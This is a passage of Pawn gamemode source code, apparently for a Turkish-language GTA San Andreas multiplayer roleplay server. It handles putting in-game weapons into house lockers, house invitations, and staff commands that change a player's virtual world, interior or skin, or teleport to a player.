					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "shotgun", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][3] == 25 && PlayerInfo[playerid][pAGuns][3] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Shotgun'unu silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][3];
					format(string,sizeof(string), "* %s adlý kiþi Shotgun'unu evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "spas12", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][3] == 27 && PlayerInfo[playerid][pAGuns][3] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "SPAS-12'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][3];
					format(string,sizeof(string), "* %s adlý kiþi SPAS-12'sini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "mp5", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "MP5'ini silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s adlý kiþi MP5'ini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}

			else if(strcmp(weaponchoice, "ak47", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][5] == 30 && PlayerInfo[playerid][pAGuns][5] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "AK47'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][5];
					format(string,sizeof(string), "* %s adlý kiþi AK-47'sini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "m4", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][5] == 31 && PlayerInfo[playerid][pAGuns][5] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "M4'ünü silah dolabnýa koydun.");
					weapon = PlayerInfo[playerid][pGuns][5];
					format(string,sizeof(string), "* %s adlý kiþi M4'ünü evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "rifle", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][6] == 33 && PlayerInfo[playerid][pAGuns][6] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Rifle'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][6];
					format(string,sizeof(string), "* %s adlý kiþi Riflesini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "sniper", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][6] == 34 && PlayerInfo[playerid][pAGuns][6] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Sniper Rifle'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][6];
					format(string,sizeof(string), "* %s adlý kiþi sniper Riflesini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "uzi", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 28 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Uzini silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s adlý kiþi uzisini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "tec9", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 32 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Tec9'unu silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "%s adlý kiþi tec9'unu evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			if(weapon == 0) return SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin.");
			if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] == 0)
			{
				HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] = weapon;
				RemovePlayerWeapon(playerid, weapon);
				SaveHouses();
				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				OnPlayerStatsUpdate(playerid);
				return 1;
			}
			else { SendClientMessage(playerid,COLOR_GREY,"Yanlýþ silah adý!"); return 1; }
		}
	}

	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID)
		{
			if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
			{
				format(string, sizeof(string), "   Baþka bir silah koymadan önce %d saniye beklemelisin.", GetPVarInt(playerid, "GiveWeaponTimer"));
				SendClientMessage(playerid,COLOR_GREY,string);
				return 1;
			}
			new maxslots = HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade];
			if(slot > maxslots)
			{
				SendClientMessage(playerid, COLOR_GREY, "Yanlýþ slot.");
				return 1;
			}

			if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] != 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu slotta zaten silahýn var.");
				return 1;
			}

			new weapon;
			if(strcmp(weaponchoice, "sdpistol", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][2] == 23 && PlayerInfo[playerid][pAGuns][2] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Susturuculu tabancaný silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][2];
					format(string,sizeof(string), "* %s adlý kiþi susturuculu tabancasýný evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "deagle", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][2] == 24 && PlayerInfo[playerid][pAGuns][2] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Desert Eagle'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][2];
					format(string,sizeof(string), "* %s adlý kiþi Desert Eagle'sini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "shotgun", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][3] == 25 && PlayerInfo[playerid][pAGuns][3] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Shotgun'unu silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][3];
					format(string,sizeof(string), "* %s adlý kiþi Shotgun'unu evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "spas12", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][3] == 27 && PlayerInfo[playerid][pAGuns][3] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "SPAS-12'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][3];
					format(string,sizeof(string), "* %s adlý kiþi SPAS-12'sini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "mp5", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "MP5'ini silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s adlý kiþi MP5'ini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "ak47", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][5] == 30 && PlayerInfo[playerid][pAGuns][5] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "AK47'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][5];
					format(string,sizeof(string), "* %s adlý kiþi AK-47'sini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "m4", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][5] == 31 && PlayerInfo[playerid][pAGuns][5] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "M4'ünü silah dolabnýa koydun.");
					weapon = PlayerInfo[playerid][pGuns][5];
					format(string,sizeof(string), "* %s adlý kiþi M4'ünü evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "rifle", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][6] == 33 && PlayerInfo[playerid][pAGuns][6] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Rifle'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][6];
					format(string,sizeof(string), "* %s adlý kiþi Riflesini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "sniper", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][6] == 34 && PlayerInfo[playerid][pAGuns][6] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Sniper Rifle'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][6];
					format(string,sizeof(string), "* %s adlý kiþi sniper Rifle'sini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "uzi", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 28 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Uzini silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s adlý kiþi uzisini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "tec9", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Tec9'unu silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "%s adlý kiþi tec9'unu evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			if(weapon == 0) return SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin.");
			if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] == 0)
			{
				HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] = weapon;
				RemovePlayerWeapon(playerid, weapon);
				SaveHouses();
				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				OnPlayerStatsUpdate(playerid);
				return 1;
			}
			else { SendClientMessage(playerid,COLOR_GREY,"Yanlýþ silah adý!"); return 1; }
		}
	}

	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Herhangi bir evin içinde deðilsin.");
	}
	return 1;
}

CMD:evimibul(playerid, params[])
{
    if(CheckPointCheck(playerid))
	{
        SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
        return 1;
    }
    if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
	{
        SetPlayerCheckpoint(playerid,HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ], 4.0);
        GameTextForPlayer(playerid, "~w~Evin yolu ~r~belirlendi", 5000, 1);
        gPlayerCheckpointStatus[playerid] = CHECKPOINT_HOME;
    }
    else
	{
        GameTextForPlayer(playerid, "~w~Evsizsin", 5000, 1);
    }
    return 1;
}

CMD:evedavetet(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "Evin yok.");

	new
		giveplayerid,
		houseid;

	if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID || PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID) {
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evedavetet [Oyuncu ID/Ýsim]");

		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_WHITE, "Kendi üzerinde /evedavetet komutunu kullanamazsýn.");

		if(giveplayerid != INVALID_PLAYER_ID) {
			new string[59 + MAX_PLAYER_NAME];
			if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID) hInviteHouse[giveplayerid] = PlayerInfo[playerid][pHouse];
			else hInviteHouse[giveplayerid] = PlayerInfo[playerid][pHouse2];
			hInviteOffer[giveplayerid] = playerid;
			format(string, sizeof(string), "   %s adlý kiþi seni evine davet etti. (/kabulet davet).", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "%s adlý kiþiyi evine davet ettin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		} else return SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
	} else {
		if(sscanf(params, "ui", giveplayerid, houseid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evedavetet [Oyuncu ID/Ýsim] [house 1/2]");

		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_WHITE, "Kendi üzerinde /evedavetet komutunu kullanamazsýn.");

		if(giveplayerid != INVALID_PLAYER_ID) {
			new string[59 + MAX_PLAYER_NAME];
			if(houseid == 1) hInviteHouse[giveplayerid] = PlayerInfo[playerid][pHouse];
			else if(houseid == 2) hInviteHouse[giveplayerid] = PlayerInfo[playerid][pHouse2];
			else return SendClientMessage(playerid, COLOR_GRAD2, "Invalid house specified.");
			hInviteOffer[giveplayerid] = playerid;
			format(string, sizeof(string), "   %s adlý kiþi seni evine davet etti. (/kabulet davet).", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "%s adlý kiþiyi evine davet ettin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		} else return SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
	}
	return 1;
}

CMD:hsetvw(playerid, params[])
{
	if(PlayerInfo[playerid][pHelper] >= 4)
	{
		new string[128], giveplayerid, vw;
		if(sscanf(params, "ud", giveplayerid, vw)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setvw [Oyuncu ID/Ýsim] [virtual world]");

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pVW] =  vw;
			SetPlayerVirtualWorld(giveplayerid,  vw);
			format(string, sizeof(string), "%s adlý oyuncunun virtual world'unu %d olarak deðiþtirdin.", GetPlayerNameEx(giveplayerid),  vw);
			SendClientMessage(playerid, COLOR_GRAD2, string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:esetvw(playerid, params[])
{
	if(PlayerInfo[playerid][pEmlak] == 1)
	{
		new string[128], giveplayerid, vw;
		if(sscanf(params, "ud", giveplayerid, vw)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setvw [Oyuncu ID/Ýsim] [virtual world]");

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pVW] =  vw;
			SetPlayerVirtualWorld(giveplayerid,  vw);
			format(string, sizeof(string), "%s adlý oyuncunun virtual world'unu %d olarak deðiþtirdin.", GetPlayerNameEx(giveplayerid),  vw);
			SendClientMessage(playerid, COLOR_GRAD2, string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:setvw(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, vw;
		if(sscanf(params, "ud", giveplayerid, vw)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setvw [Oyuncu ID/Ýsim] [virtual world]");

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pVW] =  vw;
			SetPlayerVirtualWorld(giveplayerid,  vw);
			format(string, sizeof(string), "%s adlý oyuncunun virtual world'unu %d olarak deðiþtirdin.", GetPlayerNameEx(giveplayerid),  vw);
			SendClientMessage(playerid, COLOR_GRAD2, string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:setint(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2 || PlayerInfo[playerid][pHelper] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid, int;
		if(sscanf(params, "ud", giveplayerid, int)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setint [Oyuncu ID/Ýsim] [interiorid]");

		if(IsPlayerConnected(giveplayerid))
		{
		    if(PlayerInfo[giveplayerid][pAdmin] <= PlayerInfo[playerid][pAdmin]) {
				PlayerInfo[giveplayerid][pInt] = int;
				SetPlayerInterior(giveplayerid, int);
				format(string, sizeof(string), "%s adlý kiþinin interiorunu %d olarak deðiþtirdin.", GetPlayerNameEx(giveplayerid), int);
				SendClientMessage(playerid, COLOR_GRAD2, string);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu seninle eþit leveldeki yada yüksek leveldeki admin üzerinde kullanamazsýn.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:hsetint(playerid, params[])
{
	if(PlayerInfo[playerid][pHelper] >= 4)
	{
		new string[128], giveplayerid, int;
		if(sscanf(params, "ud", giveplayerid, int)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /hsetint [Oyuncu ID/Ýsim] [interiorid]");

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pInt] = int;
			SetPlayerInterior(giveplayerid, int);
			format(string, sizeof(string), "%s adlý kiþinin interiorunu %d olarak deðiþtirdin.", GetPlayerNameEx(giveplayerid), int);
			SendClientMessage(playerid, COLOR_GRAD2, string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:setskin(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			string[128],
			giveplayerid,
			skinid;

		if(sscanf(params, "ud", giveplayerid, skinid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setskin [Oyuncu ID/Ýsim] [skinid]");

		if(giveplayerid != INVALID_PLAYER_ID) {
			if(!IsInvalidSkin(skinid)) {
				if(GetPlayerSkin(giveplayerid) == skinid)
					return SendClientMessage(playerid, COLOR_WHITE, "Oyuncu zaten seçtiðin kýyafeti giyiyor.");

			    if(AdminDuty[giveplayerid] == 0 || giveplayerid == playerid) {
					PlayerInfo[giveplayerid][pSkin] = skinid;
					format(string, sizeof(string), "Kýyafetin %d olarak %s tarafýndan deðiþtirildi.", skinid, GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);
					format(string, sizeof(string), "%s adlý kiþiye %d ID'li kýyafeti verdin.", GetPlayerNameEx(giveplayerid), skinid);
					SendClientMessage(playerid, COLOR_WHITE, string);
					SetPlayerSkin(giveplayerid, PlayerInfo[giveplayerid][pSkin]);
				} else return SendClientMessage(playerid, COLOR_GRAD1, "Kendin hariç iþbaþýnda olan hiçbir adminin kýyafetini deðiþtiremezsin.");
			}
			else return SendClientMessage(playerid, COLOR_GREY, "Yanlýþ Skin ID!");
		}
	}
	else return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:gotoid(playerid, params[])
{
	new giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gotoid [Oyuncu ID/Ýsim]");

	new Float:plocx,Float:plocy,Float:plocz;
	if(IsPlayerConnected(giveplayerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    	{
	        	SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
				return 1;
	    	}
			if(GetPlayerState(giveplayerid) == PLAYER_STATE_SPECTATING)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu birini izliyor.");
				return 1;
			}
			if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Izlerken bunu yapamazsýn.");
				return 1;
			}
			GetPlayerPos(giveplayerid, plocx, plocy, plocz);
			Streamer_UpdateEx(playerid, plocx, plocy, plocz);

			if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
